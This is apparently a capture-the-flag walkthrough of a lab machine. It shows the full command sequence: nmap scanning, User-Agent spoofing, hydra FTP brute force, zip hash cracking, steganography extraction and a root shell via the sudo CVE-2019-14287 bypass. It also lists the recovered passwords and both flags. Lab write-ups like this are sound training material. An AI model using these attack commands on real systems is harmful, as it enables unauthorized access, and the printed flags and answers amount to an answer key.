#  Enumeration

I  have  use  this  nmap  command  :

```bash

nmap  -sC  -sV  -T4  "IP  Machine"

```

and  the  result  was  

```

PORT      STATE  SERVICE  VERSION

21/tcp  open    ftp          vsftpd  3.0.3

22/tcp  open    ssh          OpenSSH  7.6p1  Ubuntu  4ubuntu0.3  (Ubuntu  Linux;  protocol  2.0)

|  ssh-hostkey:  

|      2048  ef1f5d04d47795066072ecf058f2cc07  (RSA)

|      256  5e02d19ac4e7430662c19e25848ae7ea  (ECDSA)

|_    256  2d005cb9fda8c8d880e3924f8b4f18e2  (ED25519)

80/tcp  open    http        Apache  httpd  2.4.29  ((Ubuntu))

|_http-title:  Annoucement

|_http-server-header:  Apache/2.4.29  (Ubuntu)

Service  Info:  OSs:  Unix,  Linux;  CPE:  cpe:/o:linux:linux_kernel



Service  detection  performed.  Please  report  any  incorrect  results  at  https://nmap.org/submit/  .

Nmap  done:  1  IP  address  (1  host  up)  scanned  in  16.17  seconds

```

**Q1**  :  How  many  ports  open

A1:  3

as  we  can  see  machine  runs  http.  let's  check  the  website

![](https://i.imgur.com/8L8GqhC.png)



they  told  us  use  your  own  **codename**  as  user-agent.  and  follow  by  Agent  **R**.  which  mean  they  may  use  the  first  latter  as  codename.

so  what  if  we  send  a  request  to  a  site  using  other  alphabets?  for  example  **A**  **B**  **C**  .....

how  would  we  do  it?  we  can  use  curl  to  spoof  our  request.  and  send  it  as  another  agent.



**Q2**:  How  you  redirect  yourself  to  a  secret  page?

A2:  user-agent

to  spoof  our  request  using  #curl  we  will  use  this  command  :

```bash

curl  -A  "ALPHABETS"  -L  "IP  MACHINE"

```

-A  :  for  spoof  our  request  should  be  followed  by  the  user  inside  quotation  mark.

-L  :  Follow  any  redirect  



---------------------------------

let's  try  it  ,  I  Have  tried  A  and  B  gives  me  same  result

![](https://i.imgur.com/wVAZBcK.png)



but  things  change  if  I  change  the  latter  to  C

![](https://i.imgur.com/5SNUjcB.png)



#  Hash  Cracking  and  Password  bruteforce

here  we  got  a  username  **Chris**  and  note  told  him  that  his  password  is  too  weak.  what  if  we  bruteforce  his  password  and  try  to  login  SSH  or  FTP?

I  tried  SSH  but  I  got  no  result,  so  u  can  skip  it  and  try  bruteforcing  FTP.  using  #hydra  we  will  use  this  command

```bash

hydra  -l  chris  -P  /usr/share/wordlists/rockyou.txt  ftp://"IP  Machine"

```

and  we  got  it.  

![](https://i.imgur.com/Dhpmjog.png)

**Q1**:  ftp  password

**A1**:crystal



joining  ftp  using  these  credentials  chris:crystal  and  this  command

```bash

ftp  "IP  MACHINE"  

```

![](https://i.imgur.com/AMrtzTH.png)

there  is  2  pictures  and  left  note  for  AGENT  J  download  it  using  get  command

```bash

get  NAMEOFFILE

```

and  let's  check  the  content  of  it.

![](https://i.imgur.com/2ocWH59.png)

the  note  says  that  there  is  things  hidden  inside  these  picture  so  let's  try  find  it.  I  have  used  strings  for  both  files

```bash

strings  cutie.png

```

and  I  found  something  interesting  in  this  picture  

![](https://i.imgur.com/3bTNa2n.png)



cutie.png  hide  txt  file  inside  it.  and  the  question  said  that  there  is  ZIP  file.  we  will  use  #binwalk  tool  to  extract  it.

```bash

binwalk  "name  of  image"

```

![](https://i.imgur.com/dBGUtuB.png)



We  would  extract  it  using  this  command  

```

binwalk  -e  "name  of  image"  --run-as=root

```



first  I  tried  without  --run-as=root  argument  and  I  got  error.  so  add  it

![](https://i.imgur.com/5TajYVB.png)

![](https://i.imgur.com/4KuNC7k.png)

we  know  that  the  zip  file  is  encrypted  so  we  will  try  #zip2john  to  get  the  hash.  and  then  crack  it  using  #john_the_ripper

```bash

zip2john  8702.zip  >  hashed

```

it  will  extract  us  file  name  **hashed**  we  will  crack  it  using  #john_the_ripper  using  this  command

```bash

john  --wordlist=/usr/share/wordlists/rockyou.txt  hashed  

```



![](https://i.imgur.com/cmsZ2mP.png)



We  got  the  password  for  zip  file  let's  answer  the  question  then  go  back  to  file

**Q2**:Zip  file  password

**A2**:alien



go  back  to  zip  file.  and  extract  it  using  :

```

7z  e  8702.zip

```

#Linux_unzip  



![](https://i.imgur.com/TBRHg3d.png)



find  what  does  it  is  contain  To_agentR.txt  check  it

![](https://i.imgur.com/atdDtDW.png)



**QXJlYTUx**

it  may  be  a  hash.  I  will  analyze  it.  using  [link](https://www.tunnelsup.com/hash-analyzer/)

![](https://i.imgur.com/YZ9JeNl.png)

it  told  me  that  is  base64.  I  will  use  [Cyberchef](https://gchq.github.io/CyberChef)

![](https://i.imgur.com/iZKt6iH.png)



**Area51**  it  may  be  a  steg  password?  answer  for  **Q3**

**Q3**  :  Steg  password

A3  :  Area51

remember  the  two  picture  we  had?  let's  use  steghide  with  .jpg  picture  it  may  hide  something..



```bash

steghide  extract  -sf  cute-alien.jpg  

```



**passpharse**:Area51

![](https://i.imgur.com/KtY1skK.png)



read  the  message

![](https://i.imgur.com/lzaAuSe.png)

we  got  a  new  Password  that  is  ==hackerrules!==  .  and  a  new  name  ==james==  



**Q4**  :  Who  is  the  other  agent  (in  full  name)?

**A4**  :  ==james==



james:hackerrules!  

is  it  creds  for  FTP  or  SSH.  let's  try  both

![](https://i.imgur.com/iJDbFC7.png)



first  try  I  am  inside  the  machine  now.  

**Q5**:  what  is  the  password  for  SSH

A5:hackerrules!





#  Capture  the  user  flag

![](https://i.imgur.com/GZynYHg.png)



**Q1**:  user  flag

**A1**:  b03d975e8c92a7c04146cfa7a5a313c7



there  is  another  image  let's  download  it  to  our  machine  and  find  what  is  it.  ==because  there  is  question  about  that  incident  in  the  picture==

#Download  from  victim  to  ur  machine  using  this  command

```

scp  <user@machineip>:Alien_autospy.jpg  /"your  directory"

```



![](https://i.imgur.com/YupiW5x.png)



![](https://i.imgur.com/BRCB8rE.png)



reverse  search  for  image  using  google  or  anything  u  want.  I  have  used  [TinEye](https://tineye.com/)  for  #reverse_image

I  found  this  result

![](https://i.imgur.com/GGExI7J.png)



Checking  Foxnews  website.

![](https://i.imgur.com/QRUsUob.png)



**Q2**:  What  is  the  incident  of  the  photo  called?

**A2**:  Roswell  alien  autopsy



#  Privilege  Escalation

#Linux_privilege_escalation  check  the  "sudo  -l  "  command

![](https://i.imgur.com/SJbUgkJ.png)



**(ALL,!root)  /bin/bash**

search  for  it  at  google

![](https://i.imgur.com/sHo8tDh.png)



![](https://i.imgur.com/STXakXE.png)



**Q1**:  CVE

**A1**:  CVE-2019-14287



![](https://i.imgur.com/LjALBb1.png)



So  we  will  use  this  command  to  get  a  root  shell

```bash

sudo  -u#-1  /bin/bash

```

![](https://i.imgur.com/H2HgnT1.png)



![](https://i.imgur.com/7eezbTU.png)





**Q2**:  root  flag

**A2**:  b53a02f55b57d4439e3341834d70c062



**Q3**  :  name  of  agent  R

**A3**:  DesKel



![](https://i.imgur.com/72R2tcs.png)

